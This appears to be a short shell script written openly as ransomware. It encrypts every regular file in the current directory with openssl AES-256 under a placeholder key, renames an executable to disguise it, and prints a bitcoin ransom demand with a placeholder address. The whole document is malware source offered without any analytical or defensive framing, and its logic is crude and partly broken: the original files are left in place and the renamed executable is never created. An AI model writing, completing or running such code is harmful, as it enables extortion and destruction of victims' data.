#!/bin/sh

# Set the virus name and extension
virus_name=ransomware.exe
extension=.encrypted

# Encrypt files with AES encryption
for file in *; do
    if [ -f "$file" ]; then
        echo Encrypting $file
        openssl enc -aes-256-cbc -salt -k your_secret_key < "$file" > "$file$extension"
    fi
done

# Rename the virus to look like a legitimate file
mv ransomware.exe virus.exe

echo The files have been encrypted.
echo To decrypt them, send $ amount in bitcoin to this address: 1AddressHere
